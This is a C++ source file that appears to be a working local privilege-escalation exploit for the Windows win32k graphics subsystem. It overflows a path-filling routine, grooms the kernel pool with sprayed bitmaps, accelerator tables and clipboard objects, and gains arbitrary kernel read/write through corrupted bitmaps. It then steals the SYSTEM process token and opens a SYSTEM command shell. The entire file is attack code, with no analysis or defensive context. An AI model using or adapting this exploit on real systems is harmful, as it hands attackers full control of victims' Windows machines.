#include<Windows.h>
#include<winddi.h>
#include<cstdio>
#include<winternl.h>
#include<psapi.h>

static VOID
xxCreateCmdLineProcess(VOID) {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

HANDLE hDevide;
PPEB PebBaseAddr;
HBITMAP ManagerHandle;
HBITMAP WorkHandle;

ULONG64 UniqueProcessIdOffset;
ULONG64 TokenOffset;
ULONG64 ActiveProcessLinks;

void getPEB() {
	typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
		IN HANDLE ProcessHandle, // 进程句柄
		IN PROCESSINFOCLASS InformationClass, // 信息类型
		OUT PVOID ProcessInformation, // 缓冲指针
		IN ULONG ProcessInformationLength, // 以字节为单位的缓冲大小
		OUT PULONG ReturnLength OPTIONAL // 写入缓冲的字节数
		);
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hModule, "NtQueryInformationProcess");
	PROCESS_BASIC_INFORMATION ProcBasicInfo = { 0 };
	PULONG returnLen = 0;
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &ProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), returnLen);
	PebBaseAddr = ProcBasicInfo.PebBaseAddress;
	if (!PebBaseAddr) {
		printf("Get PEB error.\n");
		return;
	}
	printf("[+]PEB Base Address:%p\n", PebBaseAddr);
}
void BitmapRead(PULONG64 addr, PULONG64 result) {
	SetBitmapBits(ManagerHandle, 8, &addr);
	GetBitmapBits(WorkHandle, 8, result);
}
void BitmapWrite(PULONG64 addr, ULONG64 value) {
	SetBitmapBits(ManagerHandle, 8, &addr);
	SetBitmapBits(WorkHandle, 8, &value);
}
void GetSystemEprocess(PULONGLONG systemEprocess) {
	LPVOID drivers[1024];
	DWORD cbNeeded;
	PVOID ntoskrnlBase;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		ntoskrnlBase = drivers[0];
	}
	else
	{
		printf("EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
		return;
	}

	HMODULE hLoaded = LoadLibraryA("ntoskrnl.exe");
	if (!hLoaded) {
		printf("Load ntoskrnl.exe error\n");
		return;
	}
	PVOID addr = GetProcAddress(hLoaded, "PsInitialSystemProcess");
	if (!addr) {
		printf("Get PsInitialSystemProcess error\n");
		return;
	}
	ULONGLONG offset = (ULONGLONG)addr - (ULONGLONG)hLoaded;
	BitmapRead((PULONG64)(offset + (ULONGLONG)ntoskrnlBase), (PULONG64)systemEprocess);
	if (!*systemEprocess) {
		printf("Read system EPROCESS error\n");
		return;
	}
}

void AllocateClipBoard2(unsigned int size) {
	BYTE* buffer;
	buffer = (PBYTE)malloc(size);
	memset(buffer, 0x41, size);
	buffer[size - 1] = 0x00;
	const size_t len = size;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), buffer, len);
	GlobalUnlock(hMem);
	//OpenClipboard(0);
	//EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	//CloseClipboard();
	GlobalFree(hMem);
}
HBITMAP bitmaps[5000];
//0xbc0(region alloc)-----0x3c0(bitmap alloc)-----0x80(free)
void fengshui() {
	HBITMAP bmp;
	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(1670, 2, 1, 8, NULL);// allocation size 0xf80 = 0xd10(1670*2*8/8) + 0x258 + 0x10(pool header)
		if (!bmp) {
			printf("[%d]Create bitmap error:%X\n",k, GetLastError());
			exit(1);
		}
		bitmaps[k] = bmp;
	}

	HACCEL hAccel, hAccel2;
	LPACCEL lpAccel;
	// Initial setup for pool fengshui.  
	lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
	// Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
	HACCEL* pAccels = (HACCEL*)malloc(sizeof(HACCEL) * 7000);
	HACCEL* pAccels2 = (HACCEL*)malloc(sizeof(HACCEL) * 7000);
	for (INT i = 0; i < 7000; i++) {
		hAccel = CreateAcceleratorTableA(lpAccel, 1);
		hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
		if (!hAccel || !hAccel2) {
			printf("[%d]Create Accel error:%X\n",i, GetLastError());
			exit(1);
		}
		pAccels[i] = hAccel;
		pAccels2[i] = hAccel2;
	}
	// Delete the allocated bitmaps to free space at beiginig of pages
	for (int k = 0; k < 5000; k++) {
		DeleteObject(bitmaps[k]);
	}
	//allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
	for (int k = 0; k < 5000; k++) {
		CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
		//CreateBitmap(2392, 1, 1, 8, NULL);
	}
	// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(0x54, 1, 1, 32, NULL); //size  = 3c0 = 0x150(0x54*1*32/8) + 0x258 + 0x10
		bitmaps[k] = bmp;
	}
	// Allocate 17500 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
	for (int k = 0; k < 1700; k++) { //1500
		AllocateClipBoard2(0x30);
	}
	// delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
	for (int k = 2000; k < 4000; k++) {
		DestroyAcceleratorTable(pAccels[k]);
		DestroyAcceleratorTable(pAccels2[k]);
	}

}

int main() {
    // Get Device context of desktop hwnd
    HDC hdc = GetDC(NULL);
    // Get a compatible Device Context to assign Bitmap to
    HDC hMemDC = CreateCompatibleDC(hdc);
    // Create Bitmap Object
    HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
    // Select the Bitmap into the Compatible DC
    HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
    //Begin path
    BeginPath(hMemDC);

static POINT points[0x3fe01];

for (int l = 0; l < 62; l++) {
	points[l].y = (l + 1) % 0x1f;
	points[l + 1].y = (l + 2) % 0x1f;
}
for (int i = 62; i < 0x3fe01; i++) {
	points[i].y = 0x777;
}
points[0x3fe00].y = 7;
for (int i = 0; i < 0x156; i++) {
	if (i == 1) {
		for (int j = 0; j < 0x3fe01; j++) {
			points[j].y = 0x777;
		}
		//points[0x3fe00].y = 7;
	}
	if (!PolylineTo(hMemDC, points, 0x3FE01)) { //(0x3fe01*0x156 + 1) * 0x30  = 0x1.0000.0050
		fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", GetLastError());
	}
}
	
	// End the path
    EndPath(hMemDC);
	fengshui();

	// Fill the path
    FillPath(hMemDC);

	LPVOID fake = VirtualAlloc((LPVOID)0x100000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!fake) {
		printf("Alloc fake mem error\n");
		return 1;
	}
	memset(fake, 1, 0x1000);

	PULONG64 recvBuf = (PULONG64)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!recvBuf) {
		printf("Alloc mem error\n");
		return 1;
	}
	memset(recvBuf, 0, 0x1000);
	long recvByte = 0;
	static int targetBitmapIndex = 0;
	for (int i = 0; i < 5000; i++) {
		recvByte = GetBitmapBits(bitmaps[i], 0x1000, recvBuf);
		if (recvByte > 0x150) {
			targetBitmapIndex = i;
			printf("I got you [%d]\n", targetBitmapIndex);
			break;
		}
	}
	ManagerHandle = bitmaps[targetBitmapIndex + 1];
	WorkHandle = bitmaps[targetBitmapIndex];
	ULONG64 leak = recvBuf[67] - 0x40;
	printf("[@]Leak:%p\n", leak);
	recvBuf[0xdf8 / 8] = leak - 0x3e0;
	SetBitmapBits(WorkHandle, 0x1000, recvBuf);
	ULONG64 recv = 0;
	for (int i = 0; i < 0xc10; i += 8) {
		BitmapRead((PULONG64)(leak + i), &recv);
		BitmapWrite((PULONG64)(leak - 0x1000 + i ),recv);
	}
	BitmapRead((PULONG64)(leak + 0xbd0), &recv);
	recv -= 2;
	BitmapWrite((PULONG64)(leak - 0x1000 + 0xbd0), recv);
	BitmapWrite((PULONG64)(leak - 0x1000 + 0xbf0), recv);

	DWORD CurrentPID = GetCurrentProcessId();
	printf("[+]Pid:%d\n", CurrentPID);

	UniqueProcessIdOffset = 0x2e8;
	TokenOffset = 0x358;
	ActiveProcessLinks = 0x2f0;

	ULONGLONG systemEprocess = 0;
	GetSystemEprocess(&systemEprocess);
	printf("[+]System EPROCESS:%p\n", systemEprocess);
	ULONG64 SystemToken = 0;
	BitmapRead((PULONG64)(systemEprocess + TokenOffset), &SystemToken);

	ULONG64 Eprocess = systemEprocess;
	ULONG64 PID = 0;
	ULONG64 CurrentToken = 0;
	do {
		BitmapRead((PULONG64)(Eprocess + ActiveProcessLinks), &Eprocess);
		Eprocess -= ActiveProcessLinks;
		BitmapRead((PULONG64)(Eprocess + UniqueProcessIdOffset), &PID);
		BitmapRead((PULONG64)(Eprocess + TokenOffset), &CurrentToken);
	} while (PID != CurrentPID);
	printf("[+]Current Eprocess:%p\n", Eprocess);
	BitmapWrite((PULONG64)(Eprocess + TokenOffset), SystemToken);
	xxCreateCmdLineProcess();

}